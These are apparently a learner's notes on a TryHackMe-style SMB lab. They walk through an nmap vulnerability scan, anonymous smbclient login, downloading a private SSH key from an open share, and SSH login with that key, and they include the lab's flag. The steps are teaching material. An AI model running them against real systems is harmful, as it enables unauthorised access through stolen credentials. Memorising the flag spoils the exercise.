 This Lab looks at exploiting SMB
```shell
export ip=10.10.230.44 # make use of enviroment variables

-   `-sV`: service/version scan
-   `--script vuln`: run a script scan with theÂ [vuln scripts](https://nmap.org/nsedoc/categories/vuln.html).
-   `-oN nmap-$ip.out`: output in normal format to the file

nmap -sV --script vuln -oN nmap-$ip.out $ip

```

login to smb
```shell
smbclient //10.10.10.2/profiles -U Anonymous -p 445
```
Read a file in smbClient
```shell
more "Working From Home Information.txt" 

# need to add the double quotes as cat doesnt work with SMB

Found email from James to John Cactus stating to use ssh to login to the server

found email: it@polointernalcoms.uk
```

If information states to login via ssh check in the .ssh folder in the shared space 
```shell
cd .ssh
```

use mget to download the file to the the current directory on the attack machine 
```shell
smb: \.ssh\> mget id_rsa

```
need to change permissions on the file inorder to make sure we have correct access
```shell
chmod 600 id_rsa  
```

add the private key to the ssh request
```shell

ssh -i id_rsa cactus@$ip  
#ls the directory
ls
#read the flag from smb.txt
cat smb.txt

THM{smb_is_fun_eh?}

```
